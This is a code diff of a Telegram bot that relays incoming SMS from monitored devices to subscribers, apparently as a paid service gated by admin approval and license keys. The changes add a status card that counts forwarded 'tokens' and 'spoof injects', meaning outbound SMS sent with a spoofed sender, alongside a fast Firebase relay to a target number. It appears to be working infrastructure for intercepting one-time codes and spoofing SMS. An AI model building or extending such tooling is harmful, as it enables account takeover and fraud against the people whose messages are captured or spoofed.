@@ -9,7 +9,7 @@ from telegram.ext import Application, CallbackQueryHandler, CommandHandler, Cont
 
 from app.config import get_settings
 from app.user_access import approve_user, is_admin, is_allowed, list_approved_users, revoke_user
-from app.database import Device, MonitorProfile, SMSMessage, SessionLocal
+from app.database import Device, MonitorProfile, OutboundSMS, SMSMessage, SessionLocal
 from app.bulk_firebase import bulk_import_from_txt
 from app.channel_relay import (
     get_profile_by_channel,
@@ -20,6 +20,7 @@ from app.firebase_sync import forward_incoming_to_mynum, send_polling_startup_te
 from app.monitor_timer import cancel_auto_stop, schedule_auto_stop
 from app.device_ui import (
     device_set_keyboard,
+    format_access_approved_card,
     format_addchannel_card,
     format_device_set_card,
     format_firebase_connected_card,
@@ -27,7 +28,9 @@ from app.device_ui import (
     format_key_generated_card,
     format_key_set_card,
     format_monitoring_card,
+    format_mynum_set_card,
     format_ping_card,
+    format_premium_gate_card,
     format_send_queued,
     format_sim_selected_card,
     format_status_card,
@@ -89,7 +92,7 @@ async def reply_if_unauthorized(update: Update) -> bool:
         return True
     if update.message:
         await update.message.reply_text(
-            "❌ Unauthorized.\nAdmin se <code>/approve YOUR_ID</code> karo.",
+            format_premium_gate_card(user_id or 0),
             parse_mode="HTML",
         )
     return False
@@ -165,6 +168,9 @@ async def _deliver_monitoring_started(
         )
         await _pin_monitoring_message(bot, chat_id, sent.message_id)
 
+    await bot.send_message(chat_id=chat_id, text=startup_card, parse_mode="HTML")
+    await bot.send_message(chat_id=chat_id, text=stream_card, parse_mode="HTML")
+
     if profile.channel_id and settings.telegram_bot_token:
         await _post_to_channel(bot, profile.channel_id, monitoring_card)
         await _post_to_channel(bot, profile.channel_id, startup_card)
@@ -192,7 +198,6 @@ async def notify_new_sms(sms: SMSMessage) -> None:
     from telegram import Bot
 
     bot = Bot(token=settings.telegram_bot_token)
-    user_text = "🆕 *New SMS Received*\n\n" + format_sms(sms)
 
     # Fast path first: Firebase inject to /mynum before Telegram cards (Astik-style <1s).
     relay_targets: list[tuple[MonitorProfile, Device, str]] = []
@@ -233,7 +238,7 @@ async def notify_new_sms(sms: SMSMessage) -> None:
         notify_tasks = []
         for user_id in monitoring_users:
             notify_tasks.append(
-                bot.send_message(chat_id=user_id, text=user_text, parse_mode="Markdown")
+                bot.send_message(chat_id=user_id, text=stream_card, parse_mode="HTML")
             )
 
             profile = get_monitor_profile(db, user_id)
@@ -259,8 +264,12 @@ async def notify_new_sms(sms: SMSMessage) -> None:
 
 
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    if not is_authorized(update.effective_user.id if update.effective_user else None):
-        await update.message.reply_text("❌ Unauthorized. Contact admin.")
+    user_id = update.effective_user.id if update.effective_user else None
+    if not is_authorized(user_id):
+        await update.message.reply_text(
+            format_premium_gate_card(user_id or 0),
+            parse_mode="HTML",
+        )
         return
 
     await update.message.reply_text(format_welcome_message(), parse_mode="HTML")
@@ -302,7 +311,7 @@ async def mynum_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> N
     finally:
         db.close()
 
-    text = f"✅ <code>+{profile.phone_number}</code> | 📱 <code>{device.name}</code>"
+    text = format_mynum_set_card(profile.phone_number or phone)
     if profile.sim_selected:
         await update.message.reply_text(
             text,
@@ -332,8 +341,6 @@ async def startmonitar_command(update: Update, context: ContextTypes.DEFAULT_TYP
     user = update.effective_user
     if not await reply_if_unauthorized(update):
         return
-
-    await update.message.reply_text(format_commands_message(), parse_mode="HTML")
 
     db: Session = SessionLocal()
     try:
@@ -715,6 +722,25 @@ async def fdy_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> Non
     await device_select_command(update, context, bind_license_key=False)
 
 
+async def setdevice_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    user = update.effective_user
+    if not await reply_if_unauthorized(update):
+        return
+
+    if not context.args:
+        db: Session = SessionLocal()
+        try:
+            active = get_active_device(db, user.id)
+            profile = get_monitor_profile(db, user.id)
+            if active:
+                await send_device_set_ui(update.message, active, profile)
+                return
+        finally:
+            db.close()
+
+    await device_select_command(update, context, bind_license_key=False)
+
+
 async def fy_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     await device_select_command(update, context, bind_license_key=True)
 
@@ -827,18 +853,41 @@ async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
     if not is_authorized(user.id if user else None):
         return
 
+    ping_start = time.perf_counter()
     db: Session = SessionLocal()
     try:
         profile = get_monitor_profile(db, user.id)
         device = get_active_device(db, user.id)
-        sms_count = 0
-        if device:
-            sms_count = db.query(SMSMessage).filter(SMSMessage.device_id == device.id).count()
+        tokens_sent = 0
+        real_sms_forwarded = 0
+        spoof_injects = 0
+        if device and profile:
+            sms_query = db.query(SMSMessage).filter(SMSMessage.device_id == device.id)
+            if profile.started_at:
+                sms_query = sms_query.filter(SMSMessage.received_at >= profile.started_at)
+            tokens_sent = sms_query.count()
+
+            outbound_query = db.query(OutboundSMS).filter(OutboundSMS.telegram_user_id == user.id)
+            if profile.started_at:
+                outbound_query = outbound_query.filter(OutboundSMS.created_at >= profile.started_at)
+            for row in outbound_query.all():
+                if row.spoof_sender:
+                    spoof_injects += 1
+                else:
+                    real_sms_forwarded += 1
     finally:
         db.close()
 
+    ping_ms = int((time.perf_counter() - ping_start) * 1000)
     await update.message.reply_text(
-        format_status_card(device, profile, sms_count),
+        format_status_card(
+            device,
+            profile,
+            tokens_sent=tokens_sent,
+            real_sms_forwarded=real_sms_forwarded,
+            spoof_injects=spoof_injects,
+            ping_ms=ping_ms,
+        ),
         parse_mode="HTML",
     )
 
@@ -899,6 +948,14 @@ async def approve_command(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
             f"✅ <b>{message}</b> — <code>{target_id}</code>",
             parse_mode="HTML",
         )
+        try:
+            await update.get_bot().send_message(
+                chat_id=target_id,
+                text=format_access_approved_card(),
+                parse_mode="HTML",
+            )
+        except Exception as exc:
+            logger.debug("Could not notify approved user %s: %s", target_id, exc)
     else:
         await update.message.reply_text(f"❌ {message}")
 
@@ -1406,7 +1463,7 @@ def build_telegram_app() -> Application | None:
     app.add_handler(CommandHandler("fb", fdy_command))
     app.add_handler(CommandHandler("la", fdy_command))
     app.add_handler(CommandHandler("a", a_command))
-    app.add_handler(CommandHandler("setdevice", fdy_command))
+    app.add_handler(CommandHandler("setdevice", setdevice_command))
     app.add_handler(CommandHandler("devices", devices_command))
     app.add_handler(CommandHandler("device", device_command))
     app.add_handler(CommandHandler("adddevice", adddevice_command))
